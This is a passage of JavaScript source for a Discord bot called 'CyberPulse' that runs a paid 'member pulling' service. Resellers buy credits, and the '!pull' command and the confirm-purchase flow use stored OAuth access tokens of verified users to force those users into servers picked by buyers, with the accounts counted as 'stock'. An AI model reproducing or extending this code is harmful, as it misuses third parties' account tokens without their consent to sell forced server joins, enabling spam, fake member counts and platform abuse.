      await recipientCredit.save();

      return message.reply(`💼 Transferred **${amount}** credits to <@${targetUser.id}>!`);
    }

    // 10. !irbal / !rbal -> RESELLER DASHBOARD
    if (command === 'irbal' || command === 'rbal') {
      const targetUser = message.mentions.users.first() || message.author;
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || { balance: 0, offlineAdded: 0, offlineConsumed: 0 };
      const avatarUrl = targetUser.displayAvatarURL({ dynamic: true, size: 256 }) || BANNER_IMAGE_URL;

      const embed = new EmbedBuilder()
        .setColor(0x2b2d31)
        .setAuthor({ name: `Reseller Balance — ${targetUser.username}`, iconURL: 'https://cdn.discordapp.com/emojis/841261569083815946.webp?size=96' })
        .setDescription(`**Status:** ✅ Active\n\n🟢 **Online Members:** 0\n🔘 **Offline Members:** ${uc.balance.toLocaleString()}\n🎉 **Reaction Members:** 0\n\n──────────────────────────────\n\n📈 **Online Added:** 0\n📈 **Offline Added:** ${uc.offlineAdded.toLocaleString()}\n📈 **Reaction Added:** 0\n📉 **Online Consumed:** 0\n📉 **Offline Consumed:** ${uc.offlineConsumed.toLocaleString()}\n📉 **Reaction Consumed:** 0`)
        .setThumbnail(avatarUrl)
        .setFooter({ text: 'CyberPulse • Reseller' })
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 11. !pull command
    if (command === 'pull') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetGuildId = args[0];
      if (!targetGuildId) return message.reply('❌ Usage: `!pull <GUILD_ID> [LIMIT]`');

      const pullLimit = args[1] ? parseInt(args[1], 10) : null;
      const statusMsg = await message.reply(`🚀 Synchronizing database tokens into \`${targetGuildId}\`...`);

      try {
        const targetGuild = await client.guilds.fetch(targetGuildId);
        const verifiedUsers = await VerifiedUser.find({});
        let successfulJoins = 0;

        for (const userRecord of verifiedUsers) {
          if (pullLimit && successfulJoins >= pullLimit) break;
          try {
            const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
            if (member) continue;

            await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
            successfulJoins++;
            await new Promise(r => setTimeout(r, 600));
          } catch (err) {}
        }
        return statusMsg.edit(`✅ Successfully pulled **${successfulJoins}** members into target server.`);
      } catch (err) {
        return statusMsg.edit('❌ Critical error executing manual pull.');
      }
    }

    // 12. !bal / !stock / !stats
    if (command === 'bal' || command === 'balance') {
      const uc = await UserCredit.findOne({ discordId: message.author.id }) || { balance: 0 };
      return message.reply(`💳 **Your Balance:** \`${uc.balance} credits\``);
    }

    if (command === 'stock') {
      const totalStock = await VerifiedUser.countDocuments();
      return message.reply(`📦 **Total Verified Stock:** \`${totalStock} accounts\``);
    }

  } catch (err) {
    console.error(`❌ Command Error (${command}):`, err);
  }
});

// ==================== INTERACTION HANDLING ====================
client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isChatInputCommand()) {
      if (interaction.commandName === 'verifiedrole') {
        const role = interaction.options.getRole('role');
        await GuildConfig.findOneAndUpdate({ guildId: interaction.guild.id }, { verifiedRoleId: role.id }, { upsert: true });
        return interaction.reply({ content: `✅ Verified role set to ${role}!`, ephemeral: true });
      }
    }

    if (interaction.isButton()) {
      if (interaction.customId === 'btn_buy_credits_ticket') {
        const cleanName = interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '');
        const channelName = `ticket-${cleanName}`;
        
        const existing = interaction.guild.channels.cache.find(c => c.name === channelName);
        if (existing) return interaction.reply({ content: `❌ Active ticket exists: ${existing}`, ephemeral: true });

        const channel = await interaction.guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
            { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
          ]
        });

        const ticketEmbed = new EmbedBuilder()
          .setColor(0x7000ff)
          .setTitle('🛒 CyberPulse Credit Purchase Ticket ⚡')
          .setDescription(`Welcome <@${interaction.user.id}>!\nState how many credits you wish to purchase.\n\n**📦 Tier Packages:**\n• Starter: 500 Credits\n• Pro (5% Bonus): 2,500 Credits\n• Enterprise (15% Bonus): 10,000 Credits`);

        await channel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed] });
        return interaction.reply({ content: `✅ Ticket created: ${channel}`, ephemeral: true });
      }

      if (interaction.customId === 'btn_my_credits') {
        const uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        return interaction.reply({ content: `💳 **Your Balance:** \`${uc.balance}\` credits`, ephemeral: true });
      }

      if (interaction.customId === 'btn_add_members') {
        const modal = new ModalBuilder().setCustomId('modal_server_id').setTitle('CyberPulse Scan 🚀');
        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel('Server ID').setStyle(TextInputStyle.Short).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        return await interaction.showModal(modal);
      }

      // PRE-FLIGHT SECURITY AUDIT & CONFIRMATION PULL
      if (interaction.customId === 'btn_confirm_purchase') {
        const session = activeSessions.get(interaction.user.id);
        if (!session) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
        if (!uc || uc.balance < session.quantity) {
          return interaction.update({ content: `❌ Insufficient credits.`, embeds: [], components: [] });
        }

        uc.balance -= session.quantity;
        uc.offlineConsumed += session.quantity;
        await uc.save();

        const opId = `DISCORD-OP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
        await Operation.create({ opId, discordId: interaction.user.id, targetGuildId: session.serverId, requestedQuantity: session.quantity });

        await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${opId}\``, embeds: [], components: [] });

        executeAsyncDispatch(opId, interaction.user.id, session.serverId, session.quantity);
      }
    }

    if (interaction.isModalSubmit()) {
      if (interaction.customId === 'modal_server_id') {
        const serverId = interaction.fields.getTextInputValue('input_server_id');

        // PRE-FLIGHT AUDIT & SECURITY SCAN
        try {
          const targetGuild = await client.guilds.fetch(serverId);
          const botMember = await targetGuild.members.fetch(client.user.id);
          const hasRoleManage = botMember.permissions.has(PermissionFlagsBits.ManageRoles);

          if (!hasRoleManage) {
            return interaction.reply({ content: '❌ **Security Pre-Flight Scan Failed:** CyberPulse bot lacks Manage Roles permission in the target server.', ephemeral: true });
          }

          activeSessions.set(interaction.user.id, { serverId, guildName: targetGuild.name, memberCount: targetGuild.memberCount });

          const selectMenu = new StringSelectMenuBuilder()
            .setCustomId('select_token_type')
            .setPlaceholder('Select token type')
            .addOptions(new StringSelectMenuOptionBuilder().setLabel('offline').setValue('offline'));

          return interaction.reply({ content: `✅ Pre-Flight Scan Passed for **${targetGuild.name}**! Select token type:`, components: [new ActionRowBuilder().addComponents(selectMenu)], ephemeral: true });

        } catch (e) {
          return interaction.reply({ content: '❌ **Pre-Flight Scan Failed:** Bot is not in target server or Server ID is invalid.', ephemeral: true });
        }
      }

      if (interaction.customId === 'modal_quantity') {
        const qty = parseInt(interaction.fields.getTextInputValue('input_quantity'), 10);
        const session = activeSessions.get(interaction.user.id);
        if (!session || isNaN(qty) || qty <= 0) return interaction.reply({ content: '❌ Invalid quantity.', ephemeral: true });

        let uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        if (qty > uc.balance) return interaction.reply({ content: `❌ Insufficient balance (${uc.balance} credits available).`, ephemeral: true });

        session.quantity = qty;

        const confirmEmbed = new EmbedBuilder()
          .setColor(0x10b981)
          .setTitle('🛡️ CyberPulse Operation Pre-Flight Preview')
          .addFields(
            { name: '🏰 Target Server', value: `${session.guildName}\n\`${session.serverId}\``, inline: true },
            { name: '👥 Target Members', value: `${session.memberCount}`, inline: true },
            { name: '🔢 Dispatch Count', value: `${qty} Members`, inline: true },
            { name: '💳 Cost', value: `${qty} Credits`, inline: true },
            { name: '⚡ Security Status', value: '`PASSED (Permissions Verified)`', inline: false }
          );

        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('btn_confirm_purchase').setLabel('Confirm & Dispatch').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId('btn_cancel_purchase').setLabel('Cancel').setStyle(ButtonStyle.Danger)
        );

        return interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
      }
    }

    if (interaction.isStringSelectMenu()) {
      if (interaction.customId === 'select_token_type') {
        const session = activeSessions.get(interaction.user.id);
        if (!session) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        const modal = new ModalBuilder().setCustomId('modal_quantity').setTitle('Dispatch Quantity');
        const qtyInput = new TextInputBuilder().setCustomId('input_quantity').setLabel('Quantity').setStyle(TextInputStyle.Short).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
        return await interaction.showModal(modal);
      }
    }
  } catch (err) {
    console.error('❌ Interaction Error:', err);
  }
});

client.login(TOKEN);
